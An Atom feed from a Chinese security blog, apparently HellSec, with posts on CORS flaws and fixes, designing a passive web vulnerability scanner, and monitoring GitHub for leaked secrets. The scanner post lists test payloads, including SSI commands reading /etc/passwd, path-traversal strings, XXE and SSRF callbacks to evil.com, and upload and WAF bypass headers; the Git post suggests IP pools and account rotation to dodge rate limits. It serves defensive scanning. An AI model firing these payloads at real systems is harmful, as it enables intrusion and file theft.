<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="/atom.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-10-01T15:55:06+08:00</updated><id>/</id><title type="html">HellSec</title><subtitle>原创网络安全博客&lt;-|-&gt;匠心独运，做有深度的良品。</subtitle><author><name>HellSec</name></author><entry><title type="html">cors漏洞之123</title><link href="/vuln/2019/09/28/cors-tips/" rel="alternate" type="text/html" title="cors漏洞之123" /><published>2019-09-28T21:13:00+08:00</published><updated>2019-09-28T21:13:00+08:00</updated><id>/vuln/2019/09/28/cors-tips</id><content type="html" xml:base="/vuln/2019/09/28/cors-tips/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;cors漏洞相信大家已经很熟悉了，一般会用于配合csrf漏洞对用户进行攻击。这里就遇到的一些case，简单讲讲可能漏报误报的点，以及相应的修复方案。
&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;cors漏洞要素&quot;&gt;cors漏洞要素&lt;/h3&gt;

&lt;p&gt;cors漏洞成功主要需要两个点，&lt;/p&gt;

&lt;p&gt;在Html Response头部里面：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Access-Control-Allow-Origin: http://www.whitedomain.com
Access-Control-Allow-Origin: true or false
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;或者同时具备：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: false
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Credentials这里是比较容易被忽略的，Credentials为false的话，数据包是不会带上&lt;strong&gt;传统的认证信息&lt;/strong&gt;，你获取到的敏感内容也是相对有限的。&lt;/p&gt;

&lt;p&gt;另外，cors漏洞也需要注意一点，你在构造测试点的时候，需要得到：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Origin: http://www.whitedomain.com
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里的域名是不能带上目录的，因为你实际上构造钓鱼页面的时候，是无法构造畸形Origin的。&lt;/p&gt;

&lt;p&gt;为啥呢，因为你从页面发送给后端的请求，浏览器会主动去解析过滤，如果在这里去构造畸形的域名，他会只取到host部分，不会处理目录，然后拿去给后端解析。&lt;/p&gt;

&lt;p&gt;比如说，浏览器会像下面这样处理去取host，由于需要配合通用后端过滤设置，需要www.whitedomain.com结尾的绕过尝试：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.evil.com/whitedomain.com ===&amp;gt; 
www.evil.com
http://www.evil.com\.whitedomain.com ===&amp;gt; 
www.evil.com
http://www.evil.com#www.whitedomain.com ===&amp;gt; www.evil.com  ==&amp;gt; 
http://www.evil.com?www.whitedomain.com ===&amp;gt; www.evil.com 

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;大概举几个例子就行，反正我这边暂时没找到可以绕过的尝试，后缀whitedomain.com，搞出来基本上取出来的真正host，也只能是whitedomain.com。&lt;/p&gt;

&lt;p&gt;这是啥意思呢？意思是你去构造畸形的域名，浏览器可能就直接过滤拦截了。
传到后端的，基本就是你想要构造的恶意目的域名。这时候，后端做好相应的防跨域配置和服务器配置，基本就可以稳定拦截了。&lt;/p&gt;

&lt;h3 id=&quot;修复方法&quot;&gt;修复方法&lt;/h3&gt;

&lt;p&gt;java后端配置举例（jetty版本）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public FilterRegistrationBean crossFilter()
{
FilterRegistrationBean registration = new FilterRegistrationBean();
registration.setFilter(new org.eclipse.jetty.servlets.CrossOriginFilter() );
registration.addInitParameter(name: &quot;allowOrigins&quot;, value: &quot;*.whitedomain.com&quot;);
registration.addInitParameter(name: &quot;allowMethods&quot;, value: &quot;GET,POST,HEAD&quot;);
registration.addInitParameter(name: &quot;allowHeaders&quot;, value: &quot;X-Requested-With,Content-Type,Accept,Origin&quot;);
registration.addUrlPatterns(&quot;/*&quot;);
registration.setName(&quot;cross-origin&quot;);
return registration;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;pom.xml配置:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;web-app&amp;gt;

    &amp;lt;filter&amp;gt;
        &amp;lt;filter-name&amp;gt;cross-origin&amp;lt;/filter-name&amp;gt;
        &amp;lt;filter-class&amp;gt;org.eclipse.jetty.servlets.CrossOriginFilter&amp;lt;/filter-class&amp;gt;
    &amp;lt;/filter&amp;gt;
    &amp;lt;filter-mapping&amp;gt;
        &amp;lt;filter-name&amp;gt;cross-origin&amp;lt;/filter-name&amp;gt;
        &amp;lt;url-pattern&amp;gt;/cometd/*&amp;lt;/url-pattern&amp;gt;
    &amp;lt;/filter-mapping&amp;gt;

&amp;lt;/web-app&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;当然，如果遇到特殊情况，需要在前端直接配置，nodejs配置举例：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 判断origin是否在域名白名单列表中

function isOriginAllowed(origin, allowedOrigin) {

if (_.isArray(allowedOrigin)) {

for(let i = 0; i &amp;lt; allowedOrigin.length; i++) {

if(isOriginAllowed(origin, allowedOrigin[i])) {

return true;

}

}

return false;

} else if (_.isString(allowedOrigin)) {

return origin === allowedOrigin;

} else if (allowedOrigin instanceof RegExp) {

return allowedOrigin.test(origin);

} else {

return !!allowedOrigin;

}

}

const ALLOW_ORIGIN = [ // 域名白名单

'*.test1.com',

'*.test2.com',

];

app.post('/formdata', function (req, res, next) {

let reqOrigin = req.headers.origin; // request响应头的origin属性

// 判断请求是否在域名白名单内

if(isOriginAllowed(reqOrigin, ALLOW_ORIGIN)) {

// 设置CORS为请求的Origin值

res.header(&quot;Access-Control-Allow-Origin&quot;, reqOrigin);

//个人觉得下面一句根据业务而定，可设定可不设定。
res.header('Access-Control-Allow-Credentials', 'true');

// 你的业务代码逻辑代码 ...

// ...

} else {

res.send({ code: -2, msg: '非法请求' });

}

});
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content><author><name>HellSec</name></author><category term="vuln" /><summary type="html">cors漏洞相信大家已经很熟悉了，一般会用于配合csrf漏洞对用户进行攻击。这里就遇到的一些case，简单讲讲可能漏报误报的点，以及相应的修复方案。</summary></entry><entry><title type="html">浅谈被动漏扫思路</title><link href="/scanner/2019/08/15/axe-scanner-design/" rel="alternate" type="text/html" title="浅谈被动漏扫思路" /><published>2019-08-15T21:13:00+08:00</published><updated>2019-08-15T21:13:00+08:00</updated><id>/scanner/2019/08/15/axe-scanner-design</id><content type="html" xml:base="/scanner/2019/08/15/axe-scanner-design/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;本文中的规则分析，大部分来自于以前被动漏扫研发的实践，以后会再接触更多业务后，会继续进行更新。其中如有纰漏或者差错，希望诸位给出修正意见。
&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;sql注入&quot;&gt;SQL注入&lt;/h3&gt;
&lt;p&gt;对于SQLI注入，可以使用sqlmapapi进行检测。&lt;/p&gt;

&lt;p&gt;优点在于，对于一些带回显和延时注入，企业内部检测没有waf拦截，会较为准确的定位。&lt;/p&gt;

&lt;p&gt;缺点在于，对于这类检测，由于属于大规模扫描，一般会采用level和risk为初级的检测。当注入所需条件比较苛刻时，可能会覆盖不全，造成遗漏。&lt;/p&gt;

&lt;h3 id=&quot;xss&quot;&gt;XSS&lt;/h3&gt;
&lt;p&gt;对于XSS的检测的话，已经解决的有两个点，是针对反射性XSS和DOM型XSS的检测。&lt;/p&gt;

&lt;p&gt;以前对awvs一类的扫描器做过调研，通常是用变形的常用的payload去fuzz，检测效率是比较低的，也容易被拦截。&lt;/p&gt;

&lt;p&gt;针对反射性XSS（包含POST型存储XSS），采用的是检测部分特殊字符，两两成对，如果未曾过滤再去借助专门的XSS扫描器进行扫描，可尝试的字符如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'
&quot;
&amp;lt; 
&amp;gt; 
/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;其实还可以做二次复检，加入敏感html标签再次尝试。这样检测成本提高不多，但会更准确一些。&lt;/p&gt;

&lt;p&gt;对于DOM型XSS检测，提供有两种方案：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;采用守护进程的方式去利用headless浏览器来hook渲染，从而检测出漏洞。
不过这种耗时比较长，有时候也因为浏览器渲染失败，以及同时发包量过大，导致内存崩溃漏掉部分漏洞。&lt;/li&gt;
  &lt;li&gt;采用类phamtomjs的引擎，直接增改数据包参数，像检测反射性XSS那样加入特殊字符，通过Ajax方式发送数据包，挨个去检测对比返回值。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;针对存储型XSS，主要存在一个痛点，返回的页面不一定是输出XSS的点，那我们应该怎么办呢？&lt;/p&gt;

&lt;p&gt;个人有个想法，我们可以通过数据库临时表记录下每个打了暗桩的post数据包，通过md5生成的是随机的值，我们可以采用这两种写法：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;A = payload+定位符+md5
B = 特殊字符+定位符+md5
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后在抓到的后续访问数据包中，如果response含有完整的A或者B，我们可以通过标记去寻找回溯存储型XSS的源头。&lt;/p&gt;

&lt;p&gt;但有人可能会说了，你这随意下暗桩，搞得满站都是垃圾数据怎么办？&lt;/p&gt;

&lt;p&gt;以前笔者就遇到过几次众测，个别人坏了规矩，登录后拿着扫描器一顿扫，搞得每个页面都在弹窗。&lt;/p&gt;

&lt;p&gt;当然这个问题sqlmap等工具也是存在的，但这跟工具本身没关系，是设计和用途的问题。&lt;/p&gt;

&lt;p&gt;这就需要业务扫描平台去做去重规则和黑名单限制了。&lt;/p&gt;

&lt;h3 id=&quot;越权漏洞&quot;&gt;越权漏洞&lt;/h3&gt;

&lt;p&gt;越权漏洞本身是不太好全自动化检测的，但我们可以做一些半自动化的工作，比如：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;配置多组关键参数对，交替去替换原request中的参数对，看是否会有关键的差异response返回。&lt;/li&gt;
  &lt;li&gt;采用混淆过的或者置空的cookie，看看返回数据是否与原response相同。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;敏感文件泄露&quot;&gt;敏感文件泄露&lt;/h3&gt;

&lt;p&gt;在web目录可能会存在敏感配置文件或者临时文件，我们需要去通过黑盒探测，做好防治工作。&lt;/p&gt;

&lt;p&gt;我们可以采用关键词命中、状态码命中、header命中等方式，多维度进行判断和探测，正确率会相对较高。&lt;/p&gt;

&lt;p&gt;目前已经有部分开源扫描器采用了这种方式，可以直接调用或者模拟使用它们的规则。&lt;/p&gt;

&lt;h3 id=&quot;命令执行漏洞&quot;&gt;命令执行漏洞&lt;/h3&gt;

&lt;p&gt;命令执行的判定主要是通过以下几种方式：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;通过回显，直接判断有没有读取到文件。&lt;/li&gt;
  &lt;li&gt;通过dns服务器，判断有无读取到漏洞主机的请求。&lt;/li&gt;
  &lt;li&gt;通过server反馈时差，判断是否执行了sleep。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;但是一般命令执行会有一定的过滤和其他限制，我们需要通过拼接和替换参数值的方式，去构造执行命令的语句，这时候我们就需要用payload去fuzz了。&lt;/p&gt;

&lt;h3 id=&quot;敏感信息泄露&quot;&gt;敏感信息泄露&lt;/h3&gt;

&lt;p&gt;对于敏感信息检测，可以通过关键词进行定位，方式主要有以下几种：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;配置信息&lt;/li&gt;
  &lt;li&gt;日志信息&lt;/li&gt;
  &lt;li&gt;敏感api和路径&lt;/li&gt;
  &lt;li&gt;cookie/token/明文密码/手机号等&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;crlf-注入&quot;&gt;CRLF 注入&lt;/h3&gt;

&lt;p&gt;检测是否成功注入header，这里有两个点需要注意：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;不建议使用敏感的头部参数，可以生造一个set-header键值对，也方便检测。&lt;/li&gt;
  &lt;li&gt;返回码需要为30x。&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payload：
%0aset-header：ceshi;%0a

关键词：
ceshi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;ssti-注入&quot;&gt;SSTI 注入&lt;/h3&gt;

&lt;p&gt;我们可以通过对response中的回显进行关键词匹配：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$\{\{11 * 11\}\}

121
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;ssi-注入&quot;&gt;SSI 注入&lt;/h3&gt;

&lt;p&gt;检测方式类似于命令执行漏洞，采用替换参数值的方式，换取回显关键词和dns请求匹配。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&amp;gt;
root

&amp;lt;!--#exec cmd=&quot;type c:\windows\win.ini&quot;--&amp;gt;
[extensions]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;cors漏洞&quot;&gt;CORS漏洞&lt;/h3&gt;

&lt;p&gt;cors漏洞检测主要通过response中的header关键词，进行相应的定位匹配：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Origin: http://www.baidu.com

Access-Control-Allow-Origin: http://www.baidu.com
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;jsonp漏洞检测&quot;&gt;JSONP漏洞检测&lt;/h3&gt;

&lt;p&gt;jsonp漏洞需要依靠callback，利用场景简单提一下：&lt;/p&gt;

&lt;p&gt;在响应中回调函数被硬编码：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;基础函数调用&lt;/li&gt;
  &lt;li&gt;对象方法调用&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;动态调用回调函数：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;URL完全可控（GET变量）&lt;/li&gt;
  &lt;li&gt;URL部分可控（GET变量），但是附加有一个数字&lt;/li&gt;
  &lt;li&gt;URL可控，但最初不会显示在请求之中&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;那我们的检测方法可以这么做，先判断header是否存在：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Type: application/json
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;再通过关键词定位json数据中，是否含有敏感数据。&lt;/p&gt;

&lt;h3 id=&quot;websocket劫持检测&quot;&gt;WEBSOCKET劫持检测&lt;/h3&gt;

&lt;p&gt;对于该漏洞，我们需要先检测header中是否含有Sec-WebSocket-Accept字段。&lt;/p&gt;

&lt;p&gt;可以把Origin: https://www.baidu.com修改Origin: http://www.evil.com，若看到服务器端response status返回了 101，可以判定有漏洞。&lt;/p&gt;

&lt;h3 id=&quot;url跳转漏洞&quot;&gt;URL跳转漏洞&lt;/h3&gt;

&lt;p&gt;首先我们需要检测是否存在任意跳转漏洞，替换参数值为下面的内容：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www.evil.com
@www.evil.com
\www.evil.com
\.www.evil.com
#www.evil.com
www.evil.com?vulnweb.cn
http://www.evil.com
http://www.evil.com?vulnweb.cn
evil.com
http://evil.com
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后，首先我们可以检测状态码为30x的response数据包里，是否Location解析出的域名为evil.com，亦或是定位evil.com特有可控的关键词。&lt;/p&gt;

&lt;p&gt;其次，某些返回包可以能会通过中转页面，借助js进行跳转。&lt;/p&gt;

&lt;p&gt;这时，我们可以选择去页面检测meta-refresh标签，以及检测以下标签：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;第1种：
&amp;lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&amp;gt;
　　window.location.href=&quot;login.jsp?backurl=&quot;+window.location.href;
　　&amp;lt;/script&amp;gt;
第2种：
&amp;lt;script language=&quot;javascript&quot;&amp;gt;
　　alert(&quot;返回&quot;);
　　window.history.back(-1);
　　&amp;lt;/script&amp;gt;
第3种：
&amp;lt;script language=&quot;javascript&quot;&amp;gt;
　　window.navigate(&quot;top.jsp&quot;);
　　&amp;lt;/script&amp;gt;
第4种：
&amp;lt;script language=&quot;JavaScript&quot;&amp;gt;
　　self.location=’top.htm’;
　　&amp;lt;/script&amp;gt;
第5种：
&amp;lt;script language=&quot;javascript&quot;&amp;gt;
　　alert(&quot;非法访问！&quot;);
　　top.location=’xx.jsp’;
　　&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;再者，我们可以采用更耗资源的暴力做法，直接用headless浏览器去发包，看是否落地域名是否为evil.com。&lt;/p&gt;

&lt;h3 id=&quot;文件读取漏洞lfi和rfi&quot;&gt;文件读取漏洞（LFI和RFI）&lt;/h3&gt;

&lt;p&gt;如果我们需要检测是否存在LFI，替换参数值对为下面的内容：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;追加：
../../../../../../../../../../../etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
../../../../../../../../../../windows/win.ini

替换：
c:\windows\win.ini
/etc/passwd

匹配关键词：
root
[extensions]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;至于RFI在放在下面一起讲。&lt;/p&gt;

&lt;h3 id=&quot;ssrf漏洞&quot;&gt;SSRF漏洞&lt;/h3&gt;

&lt;p&gt;本漏洞可以可以跟RFI采用类似的检测办法，采用DNS服务器来读取请求。&lt;/p&gt;

&lt;p&gt;这里提一下，如果是内网搭建DNS服务器，我们可以规避不能外联和内网IP限制的问题，能更精确的去进行检测。&lt;/p&gt;

&lt;p&gt;检测关键词如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://vuln.evil.com/index.jsp
http://127.0.0.1/index.jsp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;发包之后，如果存在漏洞，可以去DNS服务接口去读取到匹配vuln.evil.com（内网DNS服务器为evil.com）的结果；
又或是读取到的内容，是否已经匹配到index.jsp里的动态脚本标签。&lt;/p&gt;

&lt;h3 id=&quot;文件下载漏洞&quot;&gt;文件下载漏洞&lt;/h3&gt;

&lt;p&gt;这里用的payload是文件读取漏洞的那套，但是定位的返回关键词不同，我们可以定位response里的header：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Type:application/octet-stream
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;xxe漏洞&quot;&gt;XXE漏洞&lt;/h3&gt;

&lt;p&gt;检测xxe漏洞的时候，有两种情况可以尝试fuzz。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;post参数值里含有xml标签时，这种情况可能需要把xxe payload编码发送。&lt;/li&gt;
  &lt;li&gt;直接post了整个xml区块到server端，这种情况可以直接将整块xml区块，替换为xxe payload。&lt;/li&gt;
  &lt;li&gt;整块的xml标签就不写出来了，这里给出附加的payload对,，同样是关键词+DNS服务监听：&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payload:
file:///etc/passwd
file:///c:/windows/win.ini
http://xxx.evil.com

匹配关键词：
root
[extensions]
以及dns监听请求evil.com
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;上传漏洞&quot;&gt;上传漏洞&lt;/h3&gt;

&lt;p&gt;上传漏洞的可操作的地方比较多，目前公布出的payload中，暂时还没有能完全囊括所有hack点，下面我们会以java为例简单讲讲。&lt;/p&gt;

&lt;h4 id=&quot;后缀&quot;&gt;后缀&lt;/h4&gt;
&lt;p&gt;在对java应用后缀绕过的时候，我们可以尝试对下面这些后缀进行fuzz：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jjspsp
jspx
jspa
jtml
jsw
jsv
jspf
jsp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;冗余绕过&quot;&gt;冗余绕过&lt;/h4&gt;
&lt;p&gt;有些地方，我们进行了hack，但是却不影响数据包发送，比如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Disposition: form-data; name=&quot;myfile&quot;;;; filename=&quot;t3.jsp&quot;

Content-Disposition2: form-data; name=&quot;Upload&quot;; filename=&quot;1.jsp&quot;

合成一行：
Content‐Disposition: form-data; name=&quot;img_crop_file&quot;; filename=&quot;1.jsp&quot;Content-Type: image/jpeg

Content‐Disposition: form‐data; name=&quot;up_picture&quot;; filename=&quot;xss.js
p&quot;

boundary后面加空格：
Content-Type: multipart/form-data; boundary= —————————47146314211411730218525550

Content-Disposition: form-data; filename=&quot;xx.jsp&quot;; name=&quot;up_picture&quot;

Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.jpg&quot;; filename=&quot;test.jsp&quot;

Content-Disposition: form-data; name=&quot;Fhq&quot;; test=&quot;5W个字符&quot;; filename=&quot;test.jsp&quot;

多个Content-Disposition可以用来绕过waf，一般server默认取的是第一个，但研究范围没有覆盖全java web server，有待验证。

绕过文件类型的验证：
Content-Type: image/jpeg

或者直接删除文件类型的验证：
Content-Type: xxxxx
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;检测上传文件有一个痛点，那就是不好自动化定位上传点。&lt;/p&gt;

&lt;p&gt;对于&lt;strong&gt;有回显的情况&lt;/strong&gt;，暂时有以下的解决办法：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;利用标签正则，手工定位返回的上传点，这种方法对于大规模扫描时不适用。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;寻找同一批response包里带有shell后缀的路径，做好web url拼接，暂存后利用shell标识去挨个判断，是否上传成功shell。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于&lt;strong&gt;无回显的情况&lt;/strong&gt;下：&lt;/p&gt;

&lt;p&gt;如果黑盒测试，只能根据常用上传目录去爆破shell文件名，以获取到shell标识为成功。&lt;/p&gt;

&lt;p&gt;否则的话，需要结合白盒定位，手动配置好路径，估算生成的文件名，去进行黑盒探测。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">本文中的规则分析，大部分来自于以前被动漏扫研发的实践，以后会再接触更多业务后，会继续进行更新。其中如有纰漏或者差错，希望诸位给出修正意见。</summary></entry><entry><title type="html">Git监控小议</title><link href="/operation/2019/07/28/sec-git-monitor/" rel="alternate" type="text/html" title="Git监控小议" /><published>2019-07-28T18:00:00+08:00</published><updated>2019-07-28T18:00:00+08:00</updated><id>/operation/2019/07/28/sec-git-monitor</id><content type="html" xml:base="/operation/2019/07/28/sec-git-monitor/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;笔者原来在涉猎git监控产品时，就只做了敏感关键词监控。后来在工作中逐渐发现，对于一般量级的企业单位，其实复合型的监控平台更符合这类企业的需求。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;那么，对于git方面的监控，我们应该做些什么呢？&lt;/p&gt;

&lt;h3 id=&quot;复合型监控&quot;&gt;复合型监控&lt;/h3&gt;

&lt;h4 id=&quot;敏感关键词监控&quot;&gt;敏感关键词监控&lt;/h4&gt;

&lt;p&gt;对于类github监控，敏感关键词监控是基础，目前主要监控点有以下几种：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;敏感email地址
敏感多级子域名
ssh key
物理机key
云平台key
硬编码的pwd
关键域名+敏感路径+敏感key的拼接
（比如https://xxx/host/{ip}?key={YOUR_API_KEY}）
组织单位标识
关键数据库名、表格名、字段名、连接字符串
vpn配置字符串
smtp配置字符串
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;大部分类github平台，查询应该是需要登录的，这里以github举个例子。&lt;/p&gt;

&lt;p&gt;我们可以用session认证，不过只有前100页的查询限制。&lt;/p&gt;

&lt;p&gt;当然，大家也可以用key+api接口，个人没采用过这个接口，据说默认搜索前5000个项目。&lt;/p&gt;

&lt;p&gt;所以利用好语法是很重要的，我们要精确地对需要监控的关键词，进行综合定位：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;搜索路径中有nsa的代码或者文件中有nsa的代码
nsa in:file,path

搜索用php写的包含userid的代码,文件名为flag，扩展名为txt
userid language:php filename:flag extension:txt

匹配关键字nsa且搜索大小为100字节的xml代码
nsa language:xml size:100

搜索conf目录下包含pass的xml代码
pass path:conf language:xml

除去名为normal_name的repo
-repo:normal_name

搜索star大于20，20&amp;lt;fork&amp;lt;30的项目
stars: &amp;gt;20 fork: 20..30


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;另外，类github平台如果做了查询限制，可以考虑采用以下几点去绕过：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IP池
多账号轮询
UA池
降频处理
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;安全监控&quot;&gt;安全监控&lt;/h4&gt;

&lt;p&gt;在大一点的企业平台，做项目管控时，会接入gitlab或者类github平台的私有项目。&lt;/p&gt;

&lt;p&gt;那么，如果要坚持精简的原则，我们需要完成哪些基础点呢？&lt;/p&gt;

&lt;p&gt;第一，版本监控
每次漏洞大规模爆发时，常常需要去检查下，己方线上环境的组件，是否出于漏洞影响范围之内。&lt;/p&gt;

&lt;p&gt;因此，维护和及时更新IT资产的checklist库，无论是实现的半自动化还是自动化监控，都是有一定积极作用的。&lt;/p&gt;

&lt;p&gt;第二，安全审计
对于项目本身，我们需要做一些代码安全审计和日常扫描。&lt;/p&gt;

&lt;p&gt;一般在代码上线，以及测试分支代码变更时，在条件允许的情况下，都应该触发自动化安全扫描。&lt;/p&gt;

&lt;p&gt;在CI自动化和日常扫描时，一旦检测到问题，需要发送报告到安全运维人员过审，再决定要不要通告开发人员，去进行整改或者代码回退。&lt;/p&gt;

&lt;p&gt;对于代码本身，可提供配置文件或者接口，供第三方软件，进行安全审计，这里不再多提。&lt;/p&gt;

&lt;h4 id=&quot;舆情监控&quot;&gt;舆情监控&lt;/h4&gt;

&lt;p&gt;现如今类github平台因为某些zz原因，成为了某些有心人撰写博客和放新闻的地方。&lt;/p&gt;

&lt;p&gt;笔者当初做舆情监控接口的时候，也添加了对这类平台的接口支持，效果感觉尚可。&lt;/p&gt;

&lt;h3 id=&quot;平台优化tips&quot;&gt;平台优化Tips&lt;/h3&gt;

&lt;h4 id=&quot;关键词定制&quot;&gt;关键词定制&lt;/h4&gt;

&lt;p&gt;如果我们在开发后期，想要去定制一些关键词咋办？&lt;/p&gt;

&lt;p&gt;存在配置文件的情况下，我们可以做关键词命中。&lt;/p&gt;

&lt;p&gt;一旦触发命中我们自己添加的关键词（不一定是标准搜索语法），也会直接通过微信或者邮件，将结果推送到负责人那里。&lt;/p&gt;

&lt;h4 id=&quot;规则可配置&quot;&gt;规则可配置&lt;/h4&gt;

